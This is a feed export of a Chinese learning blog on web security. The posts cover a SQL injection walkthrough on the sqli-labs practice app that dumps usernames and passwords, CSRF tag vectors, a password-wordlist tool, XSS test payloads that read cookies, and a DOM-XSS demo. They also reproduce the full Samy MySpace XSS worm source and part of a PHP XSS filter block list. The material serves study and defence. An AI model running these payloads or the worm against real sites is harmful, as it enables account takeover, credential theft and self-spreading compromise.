        <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="1-概念及原理"><a href="#1-概念及原理" class="headerlink" title="1.概念及原理"></a>1.概念及原理</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，之后再将这些参数传递给后台的SQL服务器加以解析并执行，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。(百度百科)<a id="more"></a></p><h3 id="2-注入类型"><a href="#2-注入类型" class="headerlink" title="2.注入类型"></a>2.注入类型</h3><h5 id="参考文章https-www-cnblogs-com-zyh0430-p-11202429-html"><a href="#参考文章https-www-cnblogs-com-zyh0430-p-11202429-html" class="headerlink" title="参考文章https://www.cnblogs.com/zyh0430/p/11202429.html"></a>参考文章<code>https://www.cnblogs.com/zyh0430/p/11202429.html</code></h5><h3 id="3-sql基本流程"><a href="#3-sql基本流程" class="headerlink" title="3.sql基本流程"></a>3.sql基本流程</h3><p>假设当前URL为<code>http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1</code><br>(1)输入单引号 ‘ 进行检验是否存在输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1 ‘</span><br></pre></td></tr></table></figure><p>(2)检验是字符型还是数字型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php?  id=1%  and 1=2</span><br></pre></td></tr></table></figure><p>   报错即为数字型<br>(3)查看这个网站所错在的表有几列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1 order by 3</span><br></pre></td></tr></table></figure><p>使用二分法，如果输入错误则报错，如果存在就维持原状。<br>(4)进行 union select联合查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,3 %23</span><br></pre></td></tr></table></figure><p>(5) 输入 version() 发现输出位查询数据库版本号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,version() %23</span><br></pre></td></tr></table></figure><p>(6)查询数据库所拥有的表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php?id=-1 union select1,2,group_concat(table_name)from information_schema.tables <span class="built_in">where</span> table_schema = database() %23</span><br></pre></td></tr></table></figure><p>(7)查询出users表里的列名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,group_concat(column_name)%20from information_schema.columns <span class="built_in">where</span> table_schema = database() and table_name =<span class="string">"users"</span>%23</span><br></pre></td></tr></table></figure><p>(8)查出users表中username列中用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2, group_concat(username) from security.users %23</span><br></pre></td></tr></table></figure><p>(9)查出user表中的password列中密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2, group_concat(password) from security.users %23</span><br></pre></td></tr></table></figure><h3 id="sql注入实例-ctf"><a href="#sql注入实例-ctf" class="headerlink" title="sql注入实例(ctf)"></a>sql注入实例(ctf)</h3><p>“百度杯”CTF比赛 九月场SQLi</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_40709439/article/details/82027422</span><br></pre></td></tr></table></figure><p>“百度杯”CTF比赛 九月场SQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/0a82851bb1c2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(五）</title>
      <link href="/2019/11/06/note5/"/>
      <url>/2019/11/06/note5/</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h2><p>全称Cross-site request forgery，是一种利用网站对用户网页浏览器的信任来挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<a id="more"></a></p><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>当下的web应用大都使用cookie来识别用户身份，只要不退出或者关闭浏览器，以后访问该网站下的页面的时候，对于用户的每一个请求，Web浏览器都会主动附带该网站的cookie来标识身份，如此用户就不需要重新认证就可以被网站识别。<br>这时如果从第三方web页面发起对当前网站域下的请求，该请求也会带上当前网站的cookie（包括对Web页面中任意文件如IMG的请求），这种认证方式称之为隐式认证，攻击者正是利用该缺陷实施CSRF攻击。</p><h5 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h5><p><img src="https://img-blog.csdnimg.cn/20191106200247637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="常见CSRF方式"><a href="#常见CSRF方式" class="headerlink" title="常见CSRF方式"></a>常见CSRF方式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;img&gt;标签属性</span><br><span class="line">&lt;img src=<span class="string">"http://www.te***.com/?command"</span>&gt;</span><br><span class="line">2.&lt;script&gt;标签属性</span><br><span class="line">&lt;script src=<span class="string">"http://www.test.com/?command"</span>&gt;</span><br><span class="line">3.&lt;iframe&gt;</span><br><span class="line">&lt;iframe src=<span class="string">"http://www.te***.com/?command"</span>&gt;</span><br><span class="line">4.JavaScript对象</span><br><span class="line">（1）&lt;script&gt;</span><br><span class="line">var foo = new Image () ;</span><br><span class="line">foo.src = <span class="string">"http: / /www. te*** . com/ ?command"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">（2）XMLHTTP</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var post_data = <span class="string">' name-value '</span> ;</span><br><span class="line">var xmlhttp=new ActiveXobject ( <span class="string">"Microsoft. XMLHTTP"</span>) ;</span><br><span class="line">xmlhttp. open (<span class="string">"POST"</span>, <span class="string">'http:/ / www. te*** . com/file.ext'</span>, <span class="literal">true</span>):</span><br><span class="line">xmlhttp. onreadystatechange = <span class="keyword">function</span> () </span><br><span class="line">&#123;<span class="keyword">if</span> (xmlhttp. readyState == 4)</span><br><span class="line">&#123;</span><br><span class="line">      alert (xmlhttp. responseText) ;      </span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.send(post_data) ;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h4><p>推荐文章：<a href="https://www.2cto.com/article/201310/248996.html" target="_blank" rel="noopener">https://www.2cto.com/article/201310/248996.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个字典生成工具</title>
      <link href="/2019/11/06/note7/"/>
      <url>/2019/11/06/note7/</url>
      
        <content type="html"><![CDATA[<p>在逛论坛的时候偶然看到一个字典生成工具，叫CUPP，感觉挺有意思，于是在github上D下来试试看<a id="more"></a>，github上搜索即得<br><img src="https://img-blog.csdnimg.cn/20200109200732805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">用python3运行脚本cupp.py显示帮助<br><img src="https://img-blog.csdnimg.cn/2020010920105938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">-h此菜单</p><p>-i有关用户密码分析的交互式问题</p><p>-w使用此选项来配置现有字典，</p><p>或WyD.pl输出以制作一些pwnsauce</p><p>-l从存储库下载巨大的单词列表</p><p>-a直接从Alecto DB解析默认的用户名和密码。</p><p>Project Alecto使用Phenoelit和CIRT的纯化数据库，这些数据库经过合并和增强。</p><p>-v程序版本<br>我试验了使用cupp.py -i通过个人信息生成字典，这里可以看到它通过一些个人相关问题来收集信息<br><img src="https://img-blog.csdnimg.cn/20200109201934957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">输入相关信息后自动生成字典在文件目录下<br><img src="https://img-blog.csdnimg.cn/20200109202048701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">拿自己的个人信息试了一下，发现了我一些账号的弱密码，再次感受到信息泄露的可怕，同时，它提醒我是时候把自己的那些弱密码账号清理掉了。</p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(四）</title>
      <link href="/2019/11/04/note4/"/>
      <url>/2019/11/04/note4/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS漏洞发掘"><a href="#XSS漏洞发掘" class="headerlink" title="XSS漏洞发掘"></a>XSS漏洞发掘</h2><h4 id="记录几种发掘xss漏洞的方法"><a href="#记录几种发掘xss漏洞的方法" class="headerlink" title="记录几种发掘xss漏洞的方法"></a>记录几种发掘xss漏洞的方法<a id="more"></a></h4><h4 id="主要有三种方法：白盒测试，黑盒测试，灰盒测试"><a href="#主要有三种方法：白盒测试，黑盒测试，灰盒测试" class="headerlink" title="主要有三种方法：白盒测试，黑盒测试，灰盒测试"></a>主要有三种方法：白盒测试，黑盒测试，灰盒测试</h4><h4 id="1-自动化测试工具-黑盒"><a href="#1-自动化测试工具-黑盒" class="headerlink" title="1.自动化测试工具(黑盒)"></a>1.自动化测试工具(黑盒)</h4><p>使用专业的xss漏洞自动化测试工具，能够快速有效的发掘漏洞，如Ratproxy(<a href="http://code.google.com/p/ratproxy/" target="_blank" rel="noopener">http://code.google.com/p/ratproxy/</a>)</p><h4 id="2-手动测试-黑盒"><a href="#2-手动测试-黑盒" class="headerlink" title="2.手动测试(黑盒)"></a>2.手动测试(黑盒)</h4><p>人工测试主要是配合查看客户端的HTML源文件发掘xss,输入<code>“&lt;script&gt;alert(0)&lt;/script&gt;”</code>等XSS攻击字符串并提交给应用程序的每个参数，然后监控这个输入的响应。如果目标程序没有对攻击字符串做出过滤,消毒和转义处理，就可以确认应用程序存在xss漏洞。<br>例如，如果针对页面的输入框进行测试，首先可以输入一些能触发xss的敏感字符，如：&lt;    &gt;    “    ‘    &amp;    #，如果这些基本字符都未被转义，则该输入框大概率存在xss漏洞，我们就可以再借此构造完整的xss代码进行测试。<br>或者我们也可以直接输入以下完整的xss代码进行尝试，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line"><span class="string">"&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">="</span>&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;IMG src=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure><p>如果提交后发现页面出现排版问题或者JS错误，也说明这个输入框可能存在XSS漏洞。<br>关于这个方法，由安全研究者Rsanke维护的XSS语句列表中持续更新最新的xss语句，大家可以参考测试web应用程序是否存在xss漏洞。<br>传送：<a href="http://ha.ckers.org/xss.html" target="_blank" rel="noopener">http://ha.ckers.org/xss.html</a></p><h4 id="2-源代码安全审计-白盒）"><a href="#2-源代码安全审计-白盒）" class="headerlink" title="2.源代码安全审计(白盒）"></a>2.源代码安全审计(白盒）</h4><p>这里的源代码指的是web服务端的程序代码，如ASP,JSP,PHP等。<br>一般思路是：查找可能咋页面输出的变量，检验他们是否受到控制，然后跟踪这些变量的传递过程，分析他们是否被HTMLlencode()之类的函数过滤。<br>推荐一个大佬的操作实例，传送门：<a href="https://www.freebuf.com/articles/web/186163.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186163.html</a></p><h4 id="3-JavaScript代码分析"><a href="#3-JavaScript代码分析" class="headerlink" title="3.JavaScript代码分析"></a>3.JavaScript代码分析</h4><p>由于Javascript功能强大，能控制Web客户端的逻辑，甚至能操作用户的输入与输出。在这个过程中，如果用户的恶意输入没有被正确处理就可能产生XSS。<br>记录一种特别的XSS—DOM-Based XSS.<br>前面的学习已经提到，DOM-Based XSS是基于DOM文档对象模型的一种漏洞，受客户端浏览器的脚本代码所影响。<br>记录一个例子：假设有如下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt; DOM-XSS <span class="built_in">test</span> &lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> var a=document.URL;</span><br><span class="line"> document.write(a.substring(a,indexOf(<span class="string">"a="</span>)+2,a.length));</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>将以上代码保存在domXSS.html,中，然后用浏览器访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/domXSS.html?a=<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>页面打印出test信息，上述代码在解析URL过程中直接提取出a参数的值，并把这个值写入页面的HTML源代码中。<br>然而，攻击者可能会以Javascript代码作为a的参数的值，导致这段代码被动态的写入页面中。如构造一个恶意的请求地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当访问以上地址时，服务器返回包含上面脚本的HTML静态文本，浏览器会把HTML文本解析成DOM，并向服务器返回代码一样执行。结果如下图：<br><img src="https://img-blog.csdnimg.cn/20191104210540934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70" alt="1"><br>由此可见，DOM XSS受客户端脚本代码的影响，分析客户端Javascript的方式，便能发掘出基于XSS的漏洞。</p><p>国外安全研究员Amit Klein发表的一篇论文中详细的讲述了DOM-Based XSS的许多概念和技术，还列举了许多可能触发改漏洞的DOM对象，附上传送门：<br><a href="http://www.webappsec.org/projects/articles/071105.html" target="_blank" rel="noopener">http://www.webappsec.org/projects/articles/071105.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(三）</title>
      <link href="/2019/11/02/note3/"/>
      <url>/2019/11/02/note3/</url>
      
        <content type="html"><![CDATA[<h3 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，杀伤力很大。引发XSS蠕虫的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合反射型XSS和存储型XSS。（百度百科)<a id="more"></a><br>当xss蠕虫与社会工程学相结合，其危害性将变得十分可怕（用户兴趣点及好奇心）。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>1.攻击者发现一个网站存在XSS漏洞，并且可以编写xss蠕虫。<br>2.利用一个宿主（用户）作为传播源头进行xss攻击。<br>3.当其他用户访问被感染的内容（页面），xss蠕虫执行以下操作。<br>  A 判断用户是否登录，如果已经登陆就执行下一步，如果没有登录则执行其他操作。<br>  B 继续判断该用户是否被感染，如果没有就感染了他，如果感染了就跳过。</p><h4 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h4><p>1.寻找XSS点<br>2。实现蠕虫行为<br>3.收集蠕虫数据<br>4.传播与感染<br>参考文章<a href="https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db</a></p><h4 id="世界上第一个xss蠕虫病毒-里程碑"><a href="#世界上第一个xss蠕虫病毒-里程碑" class="headerlink" title="世界上第一个xss蠕虫病毒(里程碑)"></a>世界上第一个xss蠕虫病毒(里程碑)</h4><p>  2005年10月4日，第一个web2.0 蠕虫诞生，年仅19岁的samy发起了对myspace.com的xss worm攻击，下附其源代码，实现方法及原理分析参考文章<br>  <a href="https://www.freebuf.com/articles/web/19408.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/19408.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  &lt;div id=mycode style=<span class="string">"BACKGROUND:url('java </span></span><br><span class="line"><span class="string">script:eval(document.all.mycode.expr)')"</span>expr=<span class="string">"var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g()&#123;varC;try&#123;varD=document.body.createTextRange();C=D.htmlText&#125;catch(e)&#123;&#125;if(C)&#123;return</span></span><br><span class="line"><span class="string">C&#125;else&#123;return eval('document.body.inne'+'rHTML')&#125;&#125;function</span></span><br><span class="line"><span class="string">getData(AU)&#123;M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')&#125;function getQueryParams()&#123;varE=document.location.search;var F=E.substring(1,E.length).split('&amp;');var AS=new Array();for(varO=0;O&lt;F.length;O++)&#123;varI=F[O].split('=');AS[I[0]]=I[1]&#125;return AS&#125;var J;varAS=getQueryParams();varL=AS['Mytoken'];varM=AS['friendID'];if(location.hostname=='profile.myspace.com')&#123;document.location='http://www.myspace.com'+location.pathname+location.search&#125;else&#123;if(!M)&#123;getData(g())&#125;main()&#125;functiongetClientFID()&#123;return findIn(g(),'up_launchIC( '+A,A)&#125;function nothing()&#123;&#125;functionparamsToString(AV)&#123;var N=new</span></span><br><span class="line"><span class="string">String();var O=0;for(var P</span></span><br><span class="line"><span class="string">in AV)&#123;if(O&gt;0)&#123;N+='&amp;'&#125;varQ=escape(AV[P]);while(Q.indexOf('+')!=-1)&#123;Q=Q.replace('+','%2B')&#125;while(Q.indexOf('&amp;')!=-1)&#123;Q=Q.replace('&amp;','%26')&#125;N+=P+'='+Q;O++&#125;return</span></span><br><span class="line"><span class="string">N&#125;function httpSend(BH,BI,BJ,BK)&#123;if(!J)&#123;return</span></span><br><span class="line"><span class="string">false&#125;eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST')&#123;J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)&#125;J.send(BK);return</span></span><br><span class="line"><span class="string">true&#125;function findIn(BF,BB,BC)&#123;varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))&#125;functiongetHiddenParameter(BF,BG)&#123;return findIn(BF,'name='+B+BG+B+' value='+B,B)&#125;function getFromURL(BF,BG)&#123;var T;if(BG=='Mytoken')&#123;T=B&#125;else&#123;T='&amp;'&#125;var U=BG+'=';varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y&#125;function getXMLObj()&#123;var Z=false;if(window.XMLHttpRequest)&#123;try&#123;Z=new XMLHttpRequest()&#125;catch(e)&#123;Z=false&#125;&#125;else</span></span><br><span class="line"><span class="string">if(window.ActiveXObject)&#123;try&#123;Z=new ActiveXObject('Msxml2.XMLHTTP')&#125;catch(e)&#123;try&#123;Z=newActiveXObject('Microsoft.XMLHTTP')&#125;catch(e)&#123;Z=false&#125;&#125;&#125;return</span></span><br><span class="line"><span class="string">Z&#125;var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);varAF;if(AE)&#123;AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF='</span></span><br><span class="line"><span class="string">but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'&#125;var AG;function getHome()&#123;if(J.readyState!=4)&#123;return&#125;varAU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1)&#123;if(AF)&#123;AG+=AF;var</span></span><br><span class="line"><span class="string">AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken='+AR,postHero,'POST',paramsToString(AS))&#125;&#125;&#125;functionpostHero()&#123;if(J.readyState!=4)&#123;return&#125;var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;function</span></span><br><span class="line"><span class="string">main()&#123;var AN=getClientFID();varBH='/index.cfm?fuseaction=user.viewProfile&amp;friendID='+AN+'&amp;Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;Mytoken='+L,processxForm,'GET')&#125;functionprocessxForm()&#123;if(xmlhttp2.readyState!=4)&#123;return&#125;var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var</span></span><br><span class="line"><span class="string">AS=new</span></span><br><span class="line"><span class="string">Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to</span></span><br><span class="line"><span class="string">Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;function</span></span><br><span class="line"><span class="string">httpSend2(BH,BI,BJ,BK)&#123;if(!xmlhttp2)&#123;return</span></span><br><span class="line"><span class="string">false&#125;eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST')&#123;xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)&#125;xmlhttp2.send(BK);return</span></span><br><span class="line"><span class="string">true&#125;"</span>&gt;&lt;/DIV&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss学习日记(二）</title>
      <link href="/2019/11/01/note2/"/>
      <url>/2019/11/01/note2/</url>
      
        <content type="html"><![CDATA[<h2 id="xss构造剖析"><a href="#xss构造剖析" class="headerlink" title="xss构造剖析"></a>xss构造剖析</h2><h4 id="1-XSS-filter"><a href="#1-XSS-filter" class="headerlink" title="1.XSS-filter"></a>1.XSS-filter</h4><p>为了防御跨站脚本攻击。开发人员会在web应用中设计一个XSS Filter,即<strong>跨站脚本过滤器</strong>，用于分析用户提交的输入，并消除潜在的跨站脚本攻击，恶意的HTML或简单的HTML格式错误等<a id="more"></a><br>它实际上是一段精心编写的过滤函数，下列是phpcms中的过滤代码文件global.func.php中的一段代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">    <span class="variable">$parm1</span> = Array(<span class="string">'javascript'</span>, <span class="string">'vbscript'</span>, <span class="string">'expression'</span>, <span class="string">'applet'</span>, <span class="string">'meta'</span>, <span class="string">'xml'</span>, <span class="string">'blink'</span>, <span class="string">'link'</span>, <span class="string">'script'</span>, <span class="string">'embed'</span>, <span class="string">'object'</span>, <span class="string">'iframe'</span>, <span class="string">'frame'</span>, <span class="string">'frameset'</span>, <span class="string">'ilayer'</span>, <span class="string">'layer'</span>, <span class="string">'bgsound'</span>, <span class="string">'title'</span>, <span class="string">'base'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$parm2</span> = Array(<span class="string">'onabort'</span>, <span class="string">'onactivate'</span>, <span class="string">'onafterprint'</span>, <span class="string">'onafterupdate'</span>, <span class="string">'onbeforeactivate'</span>, <span class="string">'onbeforecopy'</span>, <span class="string">'onbeforecut'</span>, <span class="string">'onbeforedeactivate'</span>, <span class="string">'onbeforeeditfocus'</span>, <span class="string">'onbeforepaste'</span>, <span class="string">'onbeforeprint'</span>, <span class="string">'onbeforeunload'</span>, <span class="string">'onbeforeupdate'</span>, <span class="string">'onblur'</span>, <span class="string">'onbounce'</span>, <span class="string">'oncellchange'</span>, <span class="string">'onchange'</span>, <span class="string">'onclick'</span>, <span class="string">'oncontextmenu'</span>, <span class="string">'oncontrolselect'</span>, <span class="string">'oncopy'</span>, <span class="string">'oncut'</span>, <span class="string">'ondataavailable'</span>, <span class="string">'ondatasetchanged'</span>, <span class="string">'ondatasetcomplete'</span>, <span class="string">'ondblclick'</span>, <span class="string">'ondeactivate'</span>, <span class="string">'ondrag'</span>, <span 